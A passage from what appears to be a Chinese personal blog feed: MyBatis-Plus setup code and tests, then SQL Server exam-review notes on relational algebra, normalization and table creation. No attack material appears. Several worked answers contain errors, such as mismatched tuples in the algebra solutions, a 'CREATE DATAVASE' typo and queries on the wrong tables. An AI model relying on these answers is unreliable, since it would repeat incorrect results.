import com.baomidou.mybatisplus.core.mapper.BaseMapper;
import com.lazycat.mybatis_plus.entity.Product;
import org.springframework.stereotype.Repository;

@Repository
public interface ProductMapper extends BaseMapper&amp;lt;Product&amp;gt; {
}
&lt;/code&gt;&lt;/pre&gt;

&lt;h1 id=&quot;handler&quot;&gt;Handler&lt;/h1&gt;

&lt;ul&gt;
  &lt;li&gt;创建Handler package&lt;/li&gt;
  &lt;li&gt;创建MyObjectHandler&lt;/li&gt;
&lt;/ul&gt;

&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;package com.lazycat.mybatis_plus.handler;

import com.baomidou.mybatisplus.core.handlers.MetaObjectHandler;
import org.apache.ibatis.reflection.MetaObject;
import org.springframework.stereotype.Component;

import java.util.Date;

@Component
public class MyObjectHandler implements MetaObjectHandler {
    @Override
    public void insertFill(MetaObject metaObject) {
        this.setFieldValByName(&quot;create_time&quot;,new Date(),metaObject);
        this.setFieldValByName(&quot;update_time&quot;,new Date(),metaObject);
    }

    @Override
    public void updateFill(MetaObject metaObject) {
        this.setFieldValByName(&quot;update_time&quot;,new Date(),metaObject);
    }
}
&lt;/code&gt;&lt;/pre&gt;

&lt;blockquote&gt;
  &lt;p&gt;主要是继承MetaObjectHandler,实现insertFill,updateFill等方法&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h1 id=&quot;测试数据库&quot;&gt;测试数据库&lt;/h1&gt;

&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;package com.lazycat.mybatis_plus;

import com.baomidou.mybatisplus.extension.plugins.pagination.Page;
import com.lazycat.mybatis_plus.entity.Product;
import com.lazycat.mybatis_plus.entity.User;
import com.lazycat.mybatis_plus.mapper.ProductMapper;
import com.lazycat.mybatis_plus.mapper.UserMapper;
import net.minidev.json.JSONUtil;
import org.junit.jupiter.api.Test;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.boot.test.context.SpringBootTest;

import java.lang.reflect.Array;
import java.util.*;

@SpringBootTest
public class CRUDtest {
    @Autowired
    private UserMapper userMapper;
    @Autowired
    private ProductMapper productMapper;
    @Test
    public void test(){
        User user = new User();
        user.setAge(19);
        user.setEmail(&quot;test@qq.com&quot;);
//        user.setCreate_time(new Date());
//        user.setCreate_time(new Date());
//        user.setId(5);
        user.setName(&quot;hhh&quot;);
        //影响的行数
        int result = userMapper.insert(user);
        System.out.println(&quot;影响的行数&quot;+result);
        System.out.println(&quot;id=&quot;+user.getId());
    }
    @Test
    public void updateById(){
        User user = new User();
        user.setId(1);
        user.setName(&quot;test1&quot;);
        user.setAge(20);
        int result = userMapper.updateById(user);
        System.out.println(&quot;影响行数:&quot;+result);
    }
    @Test
    //并发测试
    public void ConcurrentUpdatetest(){
        Product product1 = productMapper.selectById(1);
        Product product2 = productMapper.selectById(1);
        product1.setPrice(product1.getPrice()+50);
        productMapper.updateById(product1);
        product2.setPrice(product2.getPrice()-30);
        int result = productMapper.updateById(product2);
        if (result == 0){
            System.out.println(&quot;pro2更新失败&quot;);
            System.out.println(&quot;pro2重新更新&quot;);
            product2 = productMapper.selectById(1);
            product2.setPrice(product2.getPrice() - 30);
            productMapper.updateById(product2);
        }
        Product product3 = productMapper.selectById(1);
        System.out.println(product3.getPrice()
        );
    }
    @Test
    public  void BatchSelectTest(){
        List&amp;lt;User&amp;gt; users = userMapper.selectBatchIds(Arrays.asList(-1, 2, 3));
        users.forEach(System.out::println);
    }
    @Test
    public void SelectByMap(){
        HashMap&amp;lt;String,Object&amp;gt; map = new HashMap&amp;lt;&amp;gt;();
        map.put(&quot;email&quot;,&quot;test@qq.com&quot;);
        List&amp;lt;User&amp;gt; users = userMapper.selectByMap(map);
        users.forEach(System.out::println);
    }
    @Test
    public  void SelectPage(){
        Page&amp;lt;User&amp;gt; pages = new Page&amp;lt;&amp;gt;(1,2);
        Page&amp;lt;User&amp;gt; userPage = userMapper.selectPage(pages,null);
        List&amp;lt;User&amp;gt; records = userPage.getRecords();
        records.forEach(System.out::println);
    }
}
&lt;/code&gt;&lt;/pre&gt;

&lt;h1 id=&quot;配置package&quot;&gt;配置package&lt;/h1&gt;

&lt;ul&gt;
  &lt;li&gt;创建config配置package&lt;/li&gt;
  &lt;li&gt;创建MyBatisPlusConfig&lt;/li&gt;
&lt;/ul&gt;

&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;package com.lazycat.mybatis_plus.config;

import com.baomidou.mybatisplus.extension.plugins.OptimisticLockerInterceptor;
import org.mybatis.spring.annotation.MapperScan;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;
import org.springframework.transaction.annotation.EnableTransactionManagement;

@EnableTransactionManagement
@Configuration
@MapperScan(&quot;com.lazycat.mybatis_plus.mapper&quot;)
public class MyBatisPlusConfig {
    /*
        乐观锁
    * */
    @Bean
    public OptimisticLockerInterceptor optimisticLockerInterceptor() {
        return new OptimisticLockerInterceptor();
    }
}
&lt;/code&gt;&lt;/pre&gt;

&lt;h1 id=&quot;分页&quot;&gt;分页&lt;/h1&gt;

&lt;ul&gt;
  &lt;li&gt;在config package 下编辑MyBatisPlusConfig&lt;/li&gt;
  &lt;li&gt;添加如下插件&lt;/li&gt;
&lt;/ul&gt;

&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;package com.lazycat.mybatis_plus.config;

import com.baomidou.mybatisplus.extension.plugins.OptimisticLockerInterceptor;
import org.mybatis.spring.annotation.MapperScan;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;
import org.springframework.transaction.annotation.EnableTransactionManagement;

@EnableTransactionManagement
@Configuration
@MapperScan(&quot;com.lazycat.mybatis_plus.mapper&quot;)
public class MyBatisPlusConfig {
    /*
     乐观锁
    * */
    @Bean
    public OptimisticLockerInterceptor optimisticLockerInterceptor() {
        return new OptimisticLockerInterceptor();
    }
    /*
    分页插件
    * */
    @Bean
    public PaginationInterceptor paginationInterceptor() {
        PaginationInterceptor paginationInterceptor = new PaginationInterceptor();
        // 设置请求的页面大于最大页后操作， true调回到首页，false 继续请求  默认false
        // paginationInterceptor.setOverflow(false);
        // 设置最大单页限制数量，默认 500 条，-1 不受限制
        // paginationInterceptor.setLimit(500);
        // 开启 count 的 join 优化,只针对部分 left join
        paginationInterceptor.setCountSqlParser(new JsqlParserCountOptimize(true));
        return paginationInterceptor;
    }
}
&lt;/code&gt;&lt;/pre&gt;</content><author><name></name></author><category term="JAVA" /><summary type="html">[toc]</summary></entry><entry><title type="html">web压力测试程序开发</title><link href="http://localhost:4000/_posts/2020-06-25-web%E5%8E%8B%E5%8A%9B%E6%B5%8B%E8%AF%95%E7%A8%8B%E5%BA%8F%E5%BC%80%E5%8F%91/" rel="alternate" type="text/html" title="web压力测试程序开发" /><published>2020-06-25T00:00:00+08:00</published><updated>2020-06-25T00:00:00+08:00</updated><id>http://localhost:4000/_posts/web%E5%8E%8B%E5%8A%9B%E6%B5%8B%E8%AF%95%E7%A8%8B%E5%BA%8F%E5%BC%80%E5%8F%91</id><content type="html" xml:base="http://localhost:4000/_posts/2020-06-25-web%E5%8E%8B%E5%8A%9B%E6%B5%8B%E8%AF%95%E7%A8%8B%E5%BA%8F%E5%BC%80%E5%8F%91/">&lt;p&gt;[toc]&lt;/p&gt;</content><author><name></name></author><category term="JAVA" /><summary type="html">[toc]</summary></entry><entry><title type="html">Sql Server期末复习</title><link href="http://localhost:4000/_posts/2020-06-24-sql-server%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/" rel="alternate" type="text/html" title="Sql Server期末复习" /><published>2020-06-24T00:00:00+08:00</published><updated>2020-06-24T00:00:00+08:00</updated><id>http://localhost:4000/_posts/sql-server%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0</id><content type="html" xml:base="http://localhost:4000/_posts/2020-06-24-sql-server%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/">&lt;p&gt;[toc]&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;&lt;strong&gt;用于期末复习,切勿用于作弊!违者后果自负!!!!!!!&lt;/strong&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h1 id=&quot;数据处理三个阶段&quot;&gt;数据处理三个阶段&lt;/h1&gt;

&lt;ul&gt;
  &lt;li&gt;概念模型&lt;/li&gt;
  &lt;li&gt;逻辑模型&lt;/li&gt;
  &lt;li&gt;物理模型&lt;/li&gt;
&lt;/ul&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;常见数据模型&quot;&gt;常见数据模型&lt;/h1&gt;

&lt;ul&gt;
  &lt;li&gt;层次模型&lt;/li&gt;
  &lt;li&gt;网状模型&lt;/li&gt;
  &lt;li&gt;关系模型&lt;/li&gt;
  &lt;li&gt;面向对象模型&lt;/li&gt;
&lt;/ul&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;rs例题&quot;&gt;R&amp;amp;S例题&lt;/h1&gt;

&lt;p&gt;R&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;A&lt;/th&gt;
      &lt;th&gt;B&lt;/th&gt;
      &lt;th&gt;C&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;3&lt;/td&gt;
      &lt;td&gt;6&lt;/td&gt;
      &lt;td&gt;7&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2&lt;/td&gt;
      &lt;td&gt;6&lt;/td&gt;
      &lt;td&gt;7&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;7&lt;/td&gt;
      &lt;td&gt;2&lt;/td&gt;
      &lt;td&gt;3&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;4&lt;/td&gt;
      &lt;td&gt;4&lt;/td&gt;
      &lt;td&gt;3&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;S&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;A&lt;/th&gt;
      &lt;th&gt;B&lt;/th&gt;
      &lt;th&gt;C&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;3&lt;/td&gt;
      &lt;td&gt;4&lt;/td&gt;
      &lt;td&gt;5&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;7&lt;/td&gt;
      &lt;td&gt;2&lt;/td&gt;
      &lt;td&gt;3&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;计算:&lt;/p&gt;

&lt;hr /&gt;

&lt;script type=&quot;math/tex; mode=display&quot;&gt;% &lt;![CDATA[
1.R\bigcup S\\
2.R-S\\
3.RXS\\
4. \prod_{2,3}(S)\\
5.\sigma_{B&lt;'5'}(R)\\
6. R\infty_{2&lt;2}S\\
7. R\infty S %]]&gt;&lt;/script&gt;

&lt;hr /&gt;

&lt;p&gt;解:&lt;/p&gt;

&lt;p&gt;1.&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;A&lt;/th&gt;
      &lt;th&gt;B&lt;/th&gt;
      &lt;th&gt;C&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;3&lt;/td&gt;
      &lt;td&gt;6&lt;/td&gt;
      &lt;td&gt;7&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2&lt;/td&gt;
      &lt;td&gt;5&lt;/td&gt;
      &lt;td&gt;7&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;7&lt;/td&gt;
      &lt;td&gt;2&lt;/td&gt;
      &lt;td&gt;3&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;4&lt;/td&gt;
      &lt;td&gt;4&lt;/td&gt;
      &lt;td&gt;3&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;3&lt;/td&gt;
      &lt;td&gt;4&lt;/td&gt;
      &lt;td&gt;5&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;2.&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;A&lt;/th&gt;
      &lt;th&gt;B&lt;/th&gt;
      &lt;th&gt;C&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;3&lt;/td&gt;
      &lt;td&gt;6&lt;/td&gt;
      &lt;td&gt;7&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2&lt;/td&gt;
      &lt;td&gt;5&lt;/td&gt;
      &lt;td&gt;7&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;4&lt;/td&gt;
      &lt;td&gt;4&lt;/td&gt;
      &lt;td&gt;3&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;3.&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;R.A&lt;/th&gt;
      &lt;th&gt;R.B&lt;/th&gt;
      &lt;th&gt;R.C&lt;/th&gt;
      &lt;th&gt;S.A&lt;/th&gt;
      &lt;th&gt;S.B&lt;/th&gt;
      &lt;th&gt;S.C&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;3&lt;/td&gt;
      &lt;td&gt;6&lt;/td&gt;
      &lt;td&gt;7&lt;/td&gt;
      &lt;td&gt;3&lt;/td&gt;
      &lt;td&gt;4&lt;/td&gt;
      &lt;td&gt;5&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;3&lt;/td&gt;
      &lt;td&gt;6&lt;/td&gt;
      &lt;td&gt;7&lt;/td&gt;
      &lt;td&gt;7&lt;/td&gt;
      &lt;td&gt;2&lt;/td&gt;
      &lt;td&gt;3&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2&lt;/td&gt;
      &lt;td&gt;5&lt;/td&gt;
      &lt;td&gt;7&lt;/td&gt;
      &lt;td&gt;3&lt;/td&gt;
      &lt;td&gt;4&lt;/td&gt;
      &lt;td&gt;5&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2&lt;/td&gt;
      &lt;td&gt;5&lt;/td&gt;
      &lt;td&gt;7&lt;/td&gt;
      &lt;td&gt;7&lt;/td&gt;
      &lt;td&gt;2&lt;/td&gt;
      &lt;td&gt;3&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;7&lt;/td&gt;
      &lt;td&gt;2&lt;/td&gt;
      &lt;td&gt;3&lt;/td&gt;
      &lt;td&gt;3&lt;/td&gt;
      &lt;td&gt;4&lt;/td&gt;
      &lt;td&gt;5&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;7&lt;/td&gt;
      &lt;td&gt;2&lt;/td&gt;
      &lt;td&gt;3&lt;/td&gt;
      &lt;td&gt;7&lt;/td&gt;
      &lt;td&gt;2&lt;/td&gt;
      &lt;td&gt;3&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;4&lt;/td&gt;
      &lt;td&gt;4&lt;/td&gt;
      &lt;td&gt;3&lt;/td&gt;
      &lt;td&gt;3&lt;/td&gt;
      &lt;td&gt;4&lt;/td&gt;
      &lt;td&gt;5&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;4&lt;/td&gt;
      &lt;td&gt;4&lt;/td&gt;
      &lt;td&gt;3&lt;/td&gt;
      &lt;td&gt;7&lt;/td&gt;
      &lt;td&gt;2&lt;/td&gt;
      &lt;td&gt;3&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;4.&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;C&lt;/th&gt;
      &lt;th&gt;B&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;5&lt;/td&gt;
      &lt;td&gt;4&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;3&lt;/td&gt;
      &lt;td&gt;2&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;5.&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;A&lt;/th&gt;
      &lt;th&gt;B&lt;/th&gt;
      &lt;th&gt;C&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;7&lt;/td&gt;
      &lt;td&gt;2&lt;/td&gt;
      &lt;td&gt;3&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;4&lt;/td&gt;
      &lt;td&gt;4&lt;/td&gt;
      &lt;td&gt;3&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;6.&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;RA&lt;/th&gt;
      &lt;th&gt;RB&lt;/th&gt;
      &lt;th&gt;RC&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;7&lt;/td&gt;
      &lt;td&gt;2&lt;/td&gt;
      &lt;td&gt;4&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;SA&lt;/th&gt;
      &lt;th&gt;SB&lt;/th&gt;
      &lt;th&gt;SC&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;3&lt;/td&gt;
      &lt;td&gt;4&lt;/td&gt;
      &lt;td&gt;5&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;7.&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;A&lt;/th&gt;
      &lt;th&gt;B&lt;/th&gt;
      &lt;th&gt;C&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;7&lt;/td&gt;
      &lt;td&gt;2&lt;/td&gt;
      &lt;td&gt;3&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;教学管理例题&quot;&gt;教学管理例题&lt;/h1&gt;

&lt;script type=&quot;math/tex; mode=display&quot;&gt;S(SNO,SNAME,AGE,SEX,COLLEGE)\\
SC(SNO,CNO,GRADE)\\
C(CNO,CNAME,CDEPT,TNAME)\\&lt;/script&gt;

&lt;ul&gt;
  &lt;li&gt;检索LIU老师教的课程号,课程名&lt;/li&gt;
&lt;/ul&gt;

&lt;script type=&quot;math/tex; mode=display&quot;&gt;\pi_{CNO,CNAME}(\sigma_{TNAME='LIU'}(C))&lt;/script&gt;

&lt;ul&gt;
  &lt;li&gt;检索年龄大于23的男生的学号和姓名&lt;/li&gt;
&lt;/ul&gt;

&lt;script type=&quot;math/tex; mode=display&quot;&gt;\pi_{SNO,SNAME}(\sigma_{SEX='M' and AGE &gt;23}(SC))&lt;/script&gt;

&lt;ul&gt;
  &lt;li&gt;检索学号为S3学生所学课程的课程名与任课老师&lt;/li&gt;
&lt;/ul&gt;

&lt;script type=&quot;math/tex; mode=display&quot;&gt;\pi_{CNAME,TNAME}(\sigma_{SNO='S3'}(SC\infty C))&lt;/script&gt;

&lt;ul&gt;
  &lt;li&gt;检索至少选修LIU老师教的课程中一门课的女生姓名&lt;/li&gt;
&lt;/ul&gt;

&lt;script type=&quot;math/tex; mode=display&quot;&gt;\pi_{SNAME}(\sigma_{TNAME='LIU' and SEX='女'}(S\infty SC \infty C))&lt;/script&gt;

&lt;ul&gt;
  &lt;li&gt;检索WANG同学不学的课程的课程号&lt;/li&gt;
&lt;/ul&gt;

&lt;script type=&quot;math/tex; mode=display&quot;&gt;\pi_{CNO}(C) - \pi_{CNO}(\sigma_{SNAME='wang'}(S\infty SC))&lt;/script&gt;

&lt;ul&gt;
  &lt;li&gt;检索至少选修两门课程的学生号&lt;/li&gt;
&lt;/ul&gt;

&lt;script type=&quot;math/tex; mode=display&quot;&gt;\pi_{1}(\sigma_{1=4  and  2 != 5}(SC \infty SC))&lt;/script&gt;

&lt;h1 id=&quot;部门例题&quot;&gt;部门例题&lt;/h1&gt;

&lt;p&gt;关系模式R(职工编号,日期,日营业额,部门名,部门经理),规定没个职工每天只有一个营业额,每个职工只能在一个部门,每个部门只有一个经理,回答:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;写出模式R的基本FD和候选键&lt;/li&gt;
&lt;/ul&gt;

&lt;script type=&quot;math/tex; mode=display&quot;&gt;FD:\\
(职工编号,日期)-&gt;日营业额\\
职工编号-&gt;部门名\\
部门名-&gt;部门经理\\
候选键:(职工编号,日期)&lt;/script&gt;

&lt;ul&gt;
  &lt;li&gt;说明R不是2NF理由,并吧R分解为2NF模式集&lt;/li&gt;
&lt;/ul&gt;

&lt;script type=&quot;math/tex; mode=display&quot;&gt;由候选键知:\\
(职工编号,日期)-&gt;日营业额\\
(职工编号,日期)-&gt;部门名\\
(职工编号,日期)-&gt;部门经理\\&lt;/script&gt;

&lt;p&gt;因为在(职工编号,日期)-&amp;gt;部门名,(职工编号,日期)-&amp;gt;部门经理 中,日期是多余属性,存在部分函数依赖,所以R不是2NF&lt;/p&gt;

&lt;p&gt;R进行分解:
&lt;script type=&quot;math/tex&quot;&gt;R1(职工编号, 日期,日营业额)\\
R2(职工编号,部门名,部门经理)\\&lt;/script&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;进而分级3NF&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;R1不存在传递依赖,所以为3NF&lt;/p&gt;

&lt;p&gt;R2中有&lt;/p&gt;

&lt;p&gt;职工编号-&amp;gt;部门名,职工编号-&amp;gt;部门经理,&lt;/p&gt;

&lt;p&gt;又部门名-&amp;gt;部门经理&lt;/p&gt;

&lt;p&gt;则存在传递依赖,R2不是3NF&lt;/p&gt;

&lt;p&gt;分解为R21(职工编号,部门名)&lt;/p&gt;

&lt;p&gt;R22(部门名,部门经理)&lt;/p&gt;

&lt;h1 id=&quot;运动例题&quot;&gt;运动例题&lt;/h1&gt;

&lt;p&gt;有关系模式R(运动员编号,比赛项目,成绩,比赛类别,比赛主管),规定:每个运动员参加一个比赛项目,只有一个成绩,每个比赛项目只属于一个比赛类别,每个比赛类别只有一个比赛主管,回答:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;写出基本FD和候选键&lt;/li&gt;
&lt;/ul&gt;

&lt;script type=&quot;math/tex; mode=display&quot;&gt;FD:\\
(运动员编号,比赛项目)-&gt;成绩\\

比赛项目-&gt;比赛类别\\
比赛类别-&gt;比赛主管\\
候选键:(运动员编号,比赛项目),比赛项目&lt;/script&gt;

&lt;ul&gt;
  &lt;li&gt;R不是2NF理由,并把R分解为2NF&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;R有两个这样的FD：&lt;/p&gt;

&lt;p&gt;​    （运动员编号，比赛项目）→ （比赛类别，比赛主管）&lt;/p&gt;

&lt;p&gt;​           比赛项目 → （比赛类别，比赛主管）&lt;/p&gt;

&lt;p&gt;可见，前一个FD是部分（局部）函数依赖，所以R不是2NF模式。&lt;/p&gt;

&lt;p&gt;分解:&lt;/p&gt;

&lt;p&gt;R1(比赛项目，比赛类别，比赛主管)&lt;/p&gt;

&lt;p&gt;R2(运动员编号，比赛项目，成绩)&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;分解为3NF&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;R2已是3NF模式。&lt;/p&gt;

&lt;p&gt;在R1中，存在两个FD：比赛项目 → 比赛类别&lt;/p&gt;

&lt;p&gt;​           比赛类别 → 比赛主管&lt;/p&gt;

&lt;p&gt;因此，“比赛项目 → 比赛主管”是一个传递依赖，R1不是3NF模式。&lt;/p&gt;

&lt;p&gt;R1应分解为R11（比赛项目，比赛类别）&lt;/p&gt;

&lt;p&gt;​      R12（比赛类别，比赛主管）&lt;/p&gt;

&lt;p&gt;这样，ρ={R11，R12，R2}是一个3NF模式集。&lt;/p&gt;

&lt;h1 id=&quot;系统数据库&quot;&gt;系统数据库&lt;/h1&gt;

&lt;ul&gt;
  &lt;li&gt;master&lt;/li&gt;
  &lt;li&gt;tempdb&lt;/li&gt;
  &lt;li&gt;model&lt;/li&gt;
  &lt;li&gt;msdb&lt;/li&gt;
  &lt;li&gt;resource&lt;/li&gt;
&lt;/ul&gt;

&lt;h1 id=&quot;数据库文件&quot;&gt;数据库文件&lt;/h1&gt;

&lt;ul&gt;
  &lt;li&gt;主数据文件,扩展名:.mdf&lt;/li&gt;
  &lt;li&gt;辅助数据文件:扩展名:.ndf&lt;/li&gt;
  &lt;li&gt;事务日志文件:扩展名:.ldf&lt;/li&gt;
&lt;/ul&gt;

&lt;h1 id=&quot;创建数据库&quot;&gt;创建数据库&lt;/h1&gt;

&lt;pre&gt;&lt;code class=&quot;language-mssql&quot;&gt;CREATE DATAVASE JXGL
ON
(
    NAME=JXGL,
    FILENAME='\D:\...\JXGL.mdf',
    SIZE=5,
    FILEGROWTH=1
)
LOG ON
(
    NAME = JXGL_LOG,
    FILENAME='D:\..\JXGL_LOG.ldf',
    SIZE=2,
    MAXSIZE=20,
    FILEGROWTH=10%
)
&lt;/code&gt;&lt;/pre&gt;

&lt;h1 id=&quot;完整性约束&quot;&gt;完整性约束&lt;/h1&gt;

&lt;ul&gt;
  &lt;li&gt;实体完整性&lt;/li&gt;
&lt;/ul&gt;

&lt;blockquote&gt;
  &lt;p&gt;每一行看做一个实体,满足唯一性&lt;/p&gt;
&lt;/blockquote&gt;

&lt;ul&gt;
  &lt;li&gt;域完整性&lt;/li&gt;
&lt;/ul&gt;

&lt;blockquote&gt;
  &lt;p&gt;指定列数据有正确的数据类型,格式,范围&lt;/p&gt;
&lt;/blockquote&gt;

&lt;ul&gt;
  &lt;li&gt;参照完整性&lt;/li&gt;
&lt;/ul&gt;

&lt;blockquote&gt;
  &lt;p&gt;维持参照表和被参照表之间的数据一致性&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h1 id=&quot;创建数据库表例子&quot;&gt;创建数据库&amp;amp;表例子&lt;/h1&gt;

&lt;pre&gt;&lt;code class=&quot;language-mssql&quot;&gt;　USE JXGL
　CREATE TABLE S
　(
     SNO NCHAR(9) NOT NULL,
     	CONSTRAINT PK_SNO PRIMARY KEY CLUSTERED
     	CHECK(SNO LIKE '201705121[0-9][0-9]'),
     SNAME NCHAR(8) NOT NULL,
     SEX NCHAR(2) NULL,
     BIRTHDATE DATE NULL,
     COLLEGE NCHAR(20) NULL
 )
 USE JXGL
 CREATE TABLE C
 (
 	CNO NCHAR(4) NOT NULL,
     CNAME NCHAR(20) NOT NULL,
     DESCRIPTION TEXT NULL,
     CREDIT REAL NULL,
     C_COLLEGE NCHAR(20)
     PRIMARY KEY(CNO)
 )
 USE JXGL
 CREATE TABLE SC
 (
     SNO CHAR(9) NOT NULL,
     CNO CHAR(4) NOT NULL,
     GRADE REAL NULL,
     PRIMARY KEY(SNO,CNO),
     FOREIGN KEY(SNO) REFERENCES S(SNO),
     FOREIGN KEY(CNO) REFERENCES C(CNO)
 )
&lt;/code&gt;&lt;/pre&gt;

&lt;h1 id=&quot;数据库维护&quot;&gt;数据库维护&lt;/h1&gt;

&lt;hr /&gt;

&lt;p&gt;参看此篇&lt;a href=&quot;/_posts/2020-05-12-sql-server常用命令总结.md&quot;&gt;文章&lt;/a&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;维护例子&quot;&gt;维护例子&lt;/h1&gt;

&lt;p&gt;对Ｓ，ＳＣ，Ｃ的查询&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;统计所有学生选修的课程门数&lt;/li&gt;
&lt;/ul&gt;

&lt;pre&gt;&lt;code class=&quot;language-mssql&quot;&gt;USE JXGL
GO
SELECT COUNT(DISTINCT CNO)
FROM SC
GO
&lt;/code&gt;&lt;/pre&gt;

&lt;ul&gt;
  &lt;li&gt;求选修Ｃ４号课程的学生的平均年龄&lt;/li&gt;
&lt;/ul&gt;

&lt;pre&gt;&lt;code class=&quot;language-mssql&quot;&gt;select AVG(AGE) FROM C join SC on C.CNO = SC.CNO 
join S ON SC.SNO = S.SNO
where S.CNO = 'C4'
&lt;/code&gt;&lt;/pre&gt;

&lt;ul&gt;
  &lt;li&gt;求学习计算机学院（ＣＳ）每门课程的学生平均成绩&lt;/li&gt;
&lt;/ul&gt;

